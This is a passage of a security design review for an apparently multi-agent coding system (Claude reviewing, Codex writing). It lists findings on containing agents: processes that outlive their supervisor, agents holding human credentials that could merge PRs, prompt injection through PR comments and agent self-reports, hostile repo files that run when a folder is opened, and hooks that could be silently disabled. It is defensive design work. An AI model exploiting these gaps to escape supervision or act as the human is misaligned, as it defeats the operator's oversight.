| **RE-06** | High | contradiction, security | TM SEC-205; CL §3.2; CMP §9.4 (`git worktree add --detach … chmod -R a-w`) | Review "checkouts" are git worktrees. (a) Symlinks are materialised: the only defence is CL-3's in-process hook, and the CLI fallback is weaker (ASM-B-03). (b) The `.git` file is present. (c) In-tree `.gitattributes` (`working-tree-encoding`, `eol`, `ident`) means Claude can read bytes different from the blob GitHub shows the human. (d) Directories are owner-writable after `chmod`, so any same-uid process can alter what Claude reads after the SHA is fixed. "What Claude reviewed" is then not provable | Build the review and reference snapshots exactly as in SEC-205: `ls-tree -r -z` plus `cat-file blob` into a fresh directory, symlinks and submodules as text placeholders, no `.git`, no attributes. Owned by the coordinator; read-only to agents (under U2, read-only via immutable flags or U1 later). Record `snapshot_tree_sha` (= `head^{tree}`) in the binding, and verify a manifest hash after the run | B (CL §3.2), C (CMP §9.4) |
| **RE-07** | High | security, ambiguous-contract | CMP §8.2, §8.6; MS §3.3, §12 (`--keep-runs`); RC §4 steps 9→15, FM-09 ("agent runs left running are allowed to finish"); TM SEC-902/704 | Detached Codex, verify and `deps_install` processes outlive the supervisor. During safe mode, fatal halt, a crash loop, or after `pause --all`, they run **unsupervised**: no deadline, no stall kill, no kill on forbidden JSONL events (`mcp_tool_call`), no output cap. Recovery adopts results at step 9 **before** step 15 re-validates authorization and revocation, and T15 does not re-check authorization currency. A revoked or spec-drifted task could still have its adopted diff committed | 1) `runwrap` enforces a hard awake-independent wall cap, rlimits (`NPROC`, `FSIZE`, `NOFILE`), the output-size cap, and a **local dead-man switch**: it kills its group if `run/heartbeat.json` is older than N min (default 10) or a `halt` file exists. 2) Safe mode, fatal halt, and SECURITY auto-pause **stop** agent groups. 3) Adoption runs the authorization guard (SM §8.1) before acting on the output; T15 and T20 re-check the authorization version. 4) `pause --all` gains `--stop-runs`, which is the default for security pauses | C (CMP §8), D (MS §3.3, §12; RC §4 reorder), E |
| **RE-08** | High | security, missing-requirement (POL) | §3.3 N1; TM SEC-106; LN §2 R-B-03; DI fact 3 | The operator's own agents (interactive Claude Code with `gh`, Linear MCP or connectors acting as "James Brown") hold **human** credentials. They can approve or merge MERCURY PRs and add the `mercury` eligibility label as the human. MERCURY increases exposure by writing agent-authored text into PRs and Linear that these agents read. No technical control on GitHub can tell them from the human | Operator policy, verified in Phase 0: (a) the operator's interactive agents get deny rules for `gh pr review --approve`, `gh pr merge`, `gh api …/merge`, and Linear merge or diff tools, **or** use a separate low-privilege GitHub identity that is not a code owner; (b) remove Linear MCP write access from interactive sessions, or accept that E3 (label added by operator) is not proof of human intent; (c) the operator approves only in the GitHub UI or app. Add to SEC-106 and to the P0 checklist | Operator, E, F |
| RE-09 | Medium | missing-requirement | TM SEC-602/603/604/605; OV §8.4–§8.6; ADR-011 §6–§8; CMP §6.3–§6.4 (no `anchors` table); RC §4 (no chain verification) | There is no off-host anchor. HMAC is optional. Chain verification is absent from startup recovery, and a failure only blocks one task. A same-uid attacker or a restore can rewrite history undetected | Revised position (see §4 item 3): SEC-603 HMAC becomes **SHOULD** (low value inside one account; keep the nullable column). SEC-604 stays **MUST** in a cheap v1 form: the chain head `(seq, hash)` goes into the `MERCURY / claude-review` check-run output and the Linear completion comment per task, and into a daily anchor comment on the ops issue. The private anchor repo is SHOULD (M8). Add an `anchors` table. RC §4 gains a step "verify chain since last anchor; mismatch → safe mode plus SECURITY". `audit verify` compares against the anchors | C, D, B |
| RE-10 | Medium | contradiction | ADR-008 (`checks:read`, `statuses:read`, `issues:write`); GH §2.1 (`checks:write`, `statuses:read`, `issues:none`); MS §11.4/§11.6 (`issues:write` on `project-mercury`); TM §6.2 (`statuses:write`) | Inconsistent App permission sets. App permissions are App-wide, so `issues:write` for heartbeat and ops alerts would apply to every target repo | One canonical table (GH §2.1) with `checks:write` and `statuses:read`. A **second App "mercury-ops"** installed only on `project-mercury` (and the anchor repo) with `issues:write` (+ `contents:write` for anchors), never on target repos. ADR-008 updated | A, B, D |
| RE-11 | Medium | security | MS §11.4, §11.6 (heartbeat and ops issues in the **public** `project-mercury`) | Anyone on GitHub can comment on these issues and `@mention` the operator with forged "MERCURY" alerts ("PR #12 verified, approve now", "run this command"). This is social engineering against L8 (R-22). The heartbeat body leaks activity cadence. Ops texts must never carry task content | Lock both issues' conversations (collaborators only). Alerts are template-only; the operator trusts only App-badged comments (documented in the runbook). Optional: host heartbeat and ops in the private anchor repo (scheduled-workflow minutes are small; the 60-day public rule disappears) | D, Operator |
| RE-12 | Medium | missing-requirement | TM SEC-304, SEC-501; GH §5.1 (Codex summary in the PR body), §6; LN §7.2; CMP §4.16 | No neutralisation of `@mentions` (`@codex review`, `@copilot`, `@dependabot`), GitHub closing keywords, or **Linear magic words** ("Fixes JAM-77" in an agent summary can close an unrelated issue through the integration) in agent-authored text. No hidden-HTML or `<details>` stripping. No type-level guarantee that sinks get redacted text | A renderer for all agent text at public sinks: quote block, neutralise `@`, closing keywords and magic words, strip HTML comments and `<details>`, length cap. Sinks accept only `Redacted<NeutralisedText>` (C-SEC-7) | C, B |
| RE-13 | Medium | security | CMP §9.1 (`~/MercuryWork`), MS §7.1 (`~/Library/Mercury`), CMP §9.5 quarantine; CX §9 protected list | Worktrees in the operator's home hold hostile files: untracked `.claude/settings.json` (rejected by the gate but left on disk), `.vscode/tasks.json` (`runOn: folderOpen`), `.envrc`, `.idea/`. If the operator, or the operator's interactive Claude, opens a worktree (for example to inspect a quarantined task), these execute **with human credentials** | Fixed by U2 (worktrees not in the operator's account). In addition, quarantine = `chmod 000` plus a move to `quarantine/`, and inspection only through `mercury show --diff`. Add `.vscode/**`, `.idea/**`, `.devcontainer/**`, `.envrc`, `.tool-versions` (and similar) to the protected list | C, D, B |
| RE-14 | Medium | missing-requirement | TM SEC-307; SM T22/T24 guards; GH §6 (`action_required` on drift) | Spec drift is enforced only at Codex dispatch. A PR can enter `AWAITING_HUMAN_APPROVAL` after the spec changed | Add `issue snapshot hash == authorization hash` to the T22 and T24 guards; on mismatch, apply the `spec_changed` hold and set the check run to `action_required` | C |
| RE-15 | Medium | contradiction | SM T25 (`github.review.post(event=REQUEST_CHANGES)`); GH GH-2, §6; CL CL-5; F App. C M6-2 | C posts bot `REQUEST_CHANGES`; B forbids it (it leaves a blocking review that needs dismissal rights) | Adopt B: COMMENT only, gate via the check run. Update SM T25, F M6-2, and narrow SEC-102 to COMMENT only | C, F, E |
| RE-16 | Medium | contradiction, missing-requirement | SM §8.5 (login compare, no tree compare, no MERCURY-APPROVE check); GH §8 M1–M7 (numeric IDs, tree compare); TM SEC-904/905 | Two merge-verification recipes, and C's is weaker. Neither detects commits on `main` that are not tied to a verified merge (for example an admin push after a temporary ruleset edit, R-B-05). Neither re-checks bot authorship of the PR's commits after `--adopt` | GH M1–M7 by numeric ID is canonical; SM §8.5 references it. Add M8 "no review by a MERCURY identity with state `APPROVED`" and M9 "every commit reachable on base since the last check is the merge commit of a verified PR or authored by the operator", raising `unexpected_base_commit` SECURITY | B, C |
| RE-17 | Medium | missing-requirement | GH §9 (every 6 h, per-repo refusal); GH §9.3; MS §15.2 onboarding | SEC-108 cadence and coverage, SEC-105 (default `GITHUB_TOKEN` read, no PR-reachable secrets, environments), SEC-506 secret scanning and push protection, SEC-112 tag protection, and SEC-705 mutation budgets are absent | Drift monitor ≤ 60 min plus at every wake, covering Actions settings, installation permissions, collaborators and CODEOWNERS blob SHA. Any deviation → **global** dispatch halt plus SECURITY (not only refusing PRs). Add the missing settings to GH §9.3 and to `mercury repo check`. Add mutation budgets to the OutboxWorker | B, D, C |
| RE-18 | Medium | ambiguous-contract | CL §2.1 (`permissionMode:"dontAsk"`, deny-all `canUseTool`, no `allowedTools`), §7.3 (managed settings optional, OQ-B-02), §8; CMP §4.6 fallback | (a) Under `dontAsk`, Read and Grep are denied unless pre-approved. Either they are listed in `allowedTools` (then confinement rests only on the PreToolUse hook) or reviews cannot read: the contract does not say which. (b) It is unverified whether `settings.disableAllHooks` also disables the SDK's programmatic hooks, which would silently remove CL-3 (new ASM-E-17; B's self-test would catch it, so the self-test must be a **hard** dispatch gate). (c) Managed settings are optional, against SEC-204 MUST. (d) Agent binaries are not hash-pinned (SEC-210/701). (e) No Codex managed `requirements.toml` | State `allowedTools:["Read","Grep","Glob"]` with the hook as the confinement, and the self-test as a blocking gate. Hash-pin the binaries in `pins.json`. Managed settings: operator decision (§5), recommended **yes** (machine-wide, also protects interactive use). Specify `requirements.toml` if ASM-E-10 holds | B, D |
| RE-19 | Medium | contradiction | OV §5.4 `~/MercuryWork`; CMP §9.1 `~/MercuryWork`; MS §7.1 `~/Library/Mercury`; CL §3.2 `~/Library/Application Support/Mercury/checkouts`; CX §3, GH §4.1 `~/Developer/mercury-worktrees`; CX §5 vs CMP §9.1 vs MS §7.1 (three `CODEX_HOME` locations); TM §8.1 `/Users/Shared/mercury` | Five work roots. Security impact: the CX §5 Codex project-trust key (`[projects."/Users/<op>/Developer/mercury-worktrees"] trust_level="untrusted"`) will not match the real path, so whether repo `.codex/config.toml` is honoured falls to defaults. `doctor` mode checks and the RC orphan sweep by cwd also miss paths | One constant work root (under U2: `/Users/mercury/Work`, space-free) and one state root. The trust key, the sweep and `doctor` derive from that constant. The self-test plants `.codex/config.toml` with a hook in the fixture and asserts it is ignored | D (owner), B, C |
| RE-20 | Medium | missing-requirement | VP L12–L14, TC-SEC-001…008, §7 gates (TC-SEC-005 at M8); TR SEC rows; TM §10 | Security tests are thin and late. No SEC-T-20 canaries in the **operator's** credential locations (TC-SEC-005 covers only MERCURY files) before the first real agent run (M4). Missing: SEC-T-24 snapshot, SEC-T-38 protected paths, SEC-T-40…43 git, SEC-T-60…63 audit, SEC-T-15 drift, SEC-T-16 cases (c)–(e). Thresholds conflict (≥ 50 cases and 80% vs SAC-04 ≥ 60 and 95%). D's Phase 0 has no ASM-E list | Import SEC-T-* as TC-SEC-009+ (E delivers in Phase 4). Gate **M4** (first real Codex on the Mac) on SEC-T-20, SEC-T-21, SEC-T-22, SEC-T-41. Gate M5 on SEC-T-16 (all cases). Adopt SAC-01…12 as gate criteria. Add ASM-E-01…17 to MS §16 | F, D, E |
| RE-21 | Medium | security | GH §7 table ("review comments (human inline)" fetched by `since` cursor, no author filter); SM T32 (`mercury:revise` label, OD-C-03); CL §4 (`pr_code_review` untrusted parts include "Codex final message") | Third-party inline comments on a public PR could enter revision prompts (SEC-313). The reviewer sees Codex's narrative about its own work, which SEC-314 excludes, and which is an anchoring and injection vector ("tests pass, security reviewed") | Filter every comment by `user.id ∈ operator_user_ids` at ingestion (C-SEC-6). The `mercury:revise` label counts only if the label event actor is the operator. Remove "Codex final message" from review inputs; the reviewer gets coordinator-run test results only (PI-14) | B, C |
| RE-22 | Medium | unverifiable-assumption | LN §2 (client-credentials token "access to public teams"); TM ASM-E-05, ASM-E-11, SEC-801/803 | The app-actor token is not team-restricted. Whether it can call Linear diff review or merge (ASM-E-05) is tracked by no Phase 0 list. A foreign PR on a managed issue is not specified to BLOCK | Add ASM-E-05 and ASM-E-11 to P0. If the token can merge, Linear writes pause until mitigated. Add SEC-803's foreign-PR rule to LN §9 and SM G-rules | B, F |
| RE-23 | Medium | missing-requirement | CX §9; CX §12 (resume on partial edits); CMP §8 | Deterministic pre-checks are incomplete: no bidi, zero-width or mixed-script scan (SEC-312); no `..` or APFS case-collision checks (SEC-403); no coordinator `O_NOFOLLOW` reads or plan-path canonicalisation (SEC-404, PI-12); no realpath-checked removal (SEC-406); no instruction-file byte check before a **resume** (SEC-209); no Codex sandbox-denial counting (SEC-903) | Add these to the CX §9 gate and the CMP WorktreeManager. Add SEC-T-39/42/43 | B, C |
| RE-24 | Medium | other (self-correction) | TM §5.2.2 single-failure table, row "SEC-201 failure alone → Yes (pre-push secret scan)"; TM SEC-T-20 location list | My own analysis overstated SEC-502. A scanner cannot detect encodings of secrets the coordinator does not hold, so "read but no egress" is **not** safe when the agent's output is published. SEC-T-20 also omits the `gh` Keychain item and `~/.claude.json` and MCP configs | Phase 4: correct TM §5.2.2 (SEC-201 failure plus *any* publish path = H broken). Add ASM-E-16 (`gh` Keychain item readable via `/usr/bin/security` by the same uid) and ASM-E-17 (`disableAllHooks` vs SDK hooks). Extend the SEC-T-20 list | E |
| RE-25 | Medium | missing-requirement | TM SEC-902/901; GH §8 ("Agent E decides whether this pause is mandatory"); SM §5 holds (no security hold) | No global security hold. Auto-pause exists only per repo after a merge-verification failure | E decision: a new hold `security_halt` (global, `stop_runs`). Set automatically on `unauthorized_merge`, `merge_without_human_approval`, `merge_content_mismatch`, `unexpected_base_commit`, governance drift, a secret-scan hit, a git-config tamper, a chain failure, or a sandbox violation. Cleared only by a human-presence `unpause`. `merged_unreviewed_head` (operator merged early) is a per-repo policy notice, not a halt | C, B, D |
| RE-26 | Low | contradiction | TR §4 (SEC-001…089 reserved); TM SEC-100…905; F ADR-P01…P15 vs ADR-001…012 | Two SEC numbering schemes | Keep E's SEC-1xx…9xx (already defined and cross-referenced). F retires the SEC-0nn anchors, or keeps them as category headers mapping to E's ranges. A's ADR numbers are canonical; F publishes the P→final map | F, E |
| RE-27 | Low | infeasible | CMP §6.5 (`host_events` deletion "with `PRAGMA recursive_triggers=OFF`") | `recursive_triggers` does not bypass a top-level `BEFORE DELETE` trigger, so the maintenance delete aborts, or someone weakens the trigger ad hoc | Exclude `host_events` from the append-only set (age-based retention, audited), or drop and recreate its trigger inside a single audited maintenance transaction | C |
| RE-28 | Low | contradiction | SM G5 `--reset` ("`--force-with-lease` on the task branch"); GH §9.2 ruleset (`non_fast_forward` on `mercury/**`, empty bypass) | The reset path is rejected by GitHub | `--reset` pushes a new fast-forward commit reverting to the coordinator SHA's tree, or closes and recreates the branch with `-r<k>` | C, B |
| RE-29 | Medium | security | MS §9.2 (`-T /usr/bin/security`), §3.5 (signed helper v2); GH §3 | Any process of the MERCURY uid that can exec `security` reads the App private key and API keys. Codex's sandbox blocking this is unverified (ASM-D-21, E5). L2 and `deps_install` use a custom profile that is not tested at all | v1: L2 and deps profiles deny `mach-lookup` to `com.apple.securityd` (or the equivalent) and E5 is extended to them. Move the **signed `mercury-keychain` helper to v1** if E5 fails for any profile. Under U2 the blast radius is MERCURY's own credentials only (not H) | D, E |

---

## 4. Positions on the known disagreements

1. **BLOCKED with auto-resume (A) vs holds separate from states (C).**
   - **Recommend C (holds).** Security has no objection, with two conditions.
   - (a) Any hold whose clearing re-enables Codex work is cleared only by the authorization guard. Example: `spec_changed` clears only through a new Claude authorization version, as C already specifies.
   - (b) Security conditions are never holds that clear automatically. They are BLOCKED reasons, or the new `security_halt` (RE-25), which needs human-presence clearing.
   - C's model keeps notification noise down, which also lowers rubber-stamp risk (R-22).
2. **`jobs` table (A) vs queue derived from task state (C).**
   - **Recommend C.** Security neutral, with one benefit: one source of truth removes a class of "job exists without guard re-check" bugs.
   - What matters is that the guard runs in the claim transaction, and that DB triggers on `runs` insert (I3/I4) back it. C has both.
3. **HMAC optional (A, C) vs required (E); anchoring.**
   - **Revised E position.**
   - Inside one macOS account (even the dedicated `mercury` account of RE-01), an attacker able to write the DB can usually also run `security` and read the HMAC key. HMAC then defends only against write-only DB tampering, which is a narrow case.
   - I therefore **downgrade SEC-603 to SHOULD** (keep the nullable `record_mac` column; implement when the signed Keychain helper exists).
   - I **keep SEC-604 MUST** in the cheap form given in RE-09. The chain head goes into App-posted artifacts that already exist (check-run output, Linear completion comment, daily ops anchor). This is the only audit control that survives a same-account compromise, and it costs almost nothing.
   - C adds an `anchors` table. D adds chain verification to startup recovery, failing closed into safe mode.
4. **Filesystem layout (B: Application Support; D: `~/Library/Mercury`; C: `~/MercuryWork`).**
   - **Recommend one state root and one work root inside the dedicated `mercury` user** (RE-01):
     - `/Users/mercury/Library/Application Support/Mercury` for state;
     - `/Users/mercury/Work` for mirrors, worktrees, snapshots and run scratch (space-free).
   - If U2 is rejected, prefer D's `~/Library/Mercury` over `~/MercuryWork`. It is less likely to be opened by the operator's IDEs and agents (RE-13).
   - B's Application Support path is rejected for agent cwd (spaces).
   - All paths come from a single constant (RE-19).
5. **Separate macOS agent user (E SEC-201) vs same-user process groups (C, D).**
   - **Resolution: U2, a dedicated user for the whole MERCURY stack. It is a v1 MUST before real agent runs.** C's and D's process-group and re-attach mechanics remain valid unchanged inside that account.
   - What I relax: "agent uid ≠ coordinator uid" (U1) becomes SHOULD (v2). It protects MERCURY's own credentials and control tokens, not the human boundary.
   - What I do not relax: no agent, test or deps process may run in an account that can read the operator's credentials.
   - A's objection (loss of login Keychain and LaunchAgent semantics) does not apply to U2: the `mercury` user has both.
   - The cost is an extra login after a reboot. That is the same availability trade D already accepted for FileVault.
6. **Merge governance G-1/G-2 (A) vs G-ORG/G-SPLIT/G-DETECT (E) vs B's detect-after.**
   - The schemes are the same thing under different names: G-1 ≡ G-DETECT ≡ B's personal mode; G-2 ≡ G-ORG.
   - **Recommend:** G-DETECT is acceptable for the sandbox and the supervised pilot, with the written risk acceptance that A-SEC-1 requires (ADR-008 must say so). **G-ORG before unattended or overnight operation** (B's and F's roadmap gate).
   - G-SPLIT is a fallback only if the operator refuses an organization **and** Phase 0 verifies ASM-E-01/02/07. Its deploy key has no `workflows` gating, so it is weaker than G-ORG for R-09.
   - Under G-DETECT the residual risk is timing-only (the merged head is the approved head). That is acceptable once RE-01 closes human impersonation.
7. **`revision_request` as a separate Claude decision (B) vs verbatim forwarding (C).**
   - **Recommend C's split**:
     - verbatim rendering of `required_change` from validated **Claude** review outputs (already Claude's words, schema-bounded);
     - a Claude `revision_request` run for **all** other sources (human review text, CI logs, conflicts).
   - Security requirement in both cases: everything is wrapped as untrusted, with no free-text authority.
   - CI logs are T4 (they come from Codex-written tests), so they never go to Codex without Claude's mediation and tagging.
8. **Linear status ownership.**
   - Security preference: **MERCURY sets `Done` only after merge verification** (F's OD-06 option b: non-closing magic words, or branch names without the issue ID). The status humans and C's dependency guard rely on should mean "verified human merge".
   - If the operator keeps integration-owned `Done` (B's default), it is acceptable only because:
     - C's dependency guard already requires a MERCURY `COMPLETED` for MERCURY-managed blockers;
     - a verification failure produces a SECURITY notification plus `security_halt` (RE-25).
9. **Requirement ID schemes.** See RE-26:
   - E's SEC-1xx…9xx are canonical for security; F maps them into the RTM with tags (F-SEC-1);
   - A's ADR-001… numbers are canonical;
   - new ADR-013 (dedicated user) and an amended ADR-008 are needed.
10. **Re-attach vs re-run after a crash.** There is no real conflict: C and D both adopt Codex and test runs, and both re-run Claude runs. Security conditions (RE-07):
    - identity triple matched;
    - the authorization guard is re-run **before** an adopted output is acted on;
    - `runwrap` enforces caps and a local dead-man switch;
    - adopted runs are never kept alive through safe mode or a security halt.
11. **DISCOVERED removed (C) vs brief.** **Support C.** There are no task rows without authority, and eligibility lives in `linear_issues`. Security is unaffected, provided the T01 eligibility guard (including E3 operator-added label) stays deterministic.
12. **MERGE_UNVERIFIED / integrity alert.**
    - **Support C's `BLOCKED(merge_verification_failed)`**, reached from `MERGED`, with these additions:
      - mandatory `security_halt` for actor, approval or content mismatches (RE-25);
      - `ack-merge` in the human-presence tier (RE-04);
      - B's `integrity_alert` is the verification artifact, not a separate state.
    - "Operator merged before Claude review" (`merged_unreviewed_head`) is a policy breach, not an attack. It produces a notice and no global halt.
13. **Raw run logs unredacted locally (C asks E).** Accepted only if all of the following hold:
    - the logs stay inside the dedicated account (U2), mode 0600;
    - they are excluded from Time Machine (D already excludes `runs/`);
    - they are never exported;
    - `run.logs` redacts on read, for every principal;
    - they are deleted at 14 days.
14. **Public security findings (OQ-B-07).** Post details for `medium` and below. For `critical`/`high`, and for any finding located **outside the PR diff** (pre-existing base code), post only the generic withheld line plus the local report ID. Vulnerabilities in already-merged public code must not be disclosed in a PR comment.

---

## 5. Items needing operator decision

| ID | Decision | E recommendation | Blocks |
|---|---|---|---|
| OD-E-01 | Run MERCURY in a dedicated macOS user account (U2) that holds none of your GitHub, Linear or SSH credentials, logged in via Fast User Switching | **Yes**, before any real Codex, test or deps run on the Mac | M4 |
| OD-E-02 | Restrict your own interactive agents: deny `gh pr review --approve` and `gh pr merge` (or give them a non-code-owner GitHub identity); remove Linear write connectors acting as you | **Yes** | Pilot (M9), policy |
| OD-E-03 | Human-presence confirmation (Touch ID or password) for security acknowledgements, `ack-merge`, adopt, grant and post-incident unpause | **Yes** (a few seconds per escalation) | M5 |
| OD-E-04 | Install root-owned Claude managed settings (also affects your interactive Claude) | **Yes** (disables bypass mode machine-wide) | M3 |
| OD-E-05 | Move target repos to a free GitHub organization (G-ORG) | Before unattended or overnight operation; G-DETECT with written risk acceptance until then | Unattended mode |
| OD-E-06 | Dependency installs: lifecycle scripts never in v1; lockfile changes need your acknowledgement before install | **Yes** (OQ-B-04 = no) | M5 |
| OD-E-07 | Heartbeat and ops alerts: public repo with locked conversations, or a private ops repo | Private repo if Actions minutes allow; otherwise lock the issues | M8 |
| OD-E-08 | Publish security findings on public PRs | Withhold critical, high and pre-existing findings (§4 item 14) | M6 |

---

## 6. Confidence

| Area | Confidence | Basis |
|---|---|---|
| RE-01 (same uid, operator `HOME`, Seatbelt reads, publish path breaks H) | **High** | Stated explicitly in five documents. Seatbelt read breadth is from discovery RT §2.5/§3.2. Encoded-secret evasion of scanners is inherent. The specific `gh` Keychain route depends on ASM-E-16, but the `hosts.yml`, MCP-config and `~/.ssh` routes do not |
| U2 as the resolution | Medium-High | Standard macOS facilities. Fast-User-Switching background behaviour (ASM-D-08) and per-user Keychain unlock need Phase 0 |
| RE-02 / RE-03 (execution outside the Codex sandbox; git redirection) | Medium-High | Mechanisms are standard git and npm behaviour. Whether Codex protects a worktree `.git` *file* is unverified |
| RE-04 (control socket) | High | Directly from CMP §5.2's own "policy-enforced" statement |
| RE-05/06/14/15/16 (contract contradictions) | High | Textual contradictions between named sections |
| Compliance matrix statuses | Medium-High | Targeted reads of large documents. A requirement satisfied in a section I did not open is possible; for every "M" or "X" I searched the whole corpus by keyword |
| Revised positions (HMAC → SHOULD, U1 → SHOULD) | Medium | Value judgement inside the same-account trust model. Open to reversal if Phase 0 shows Keychain ACLs can bind to a signed helper cheaply |
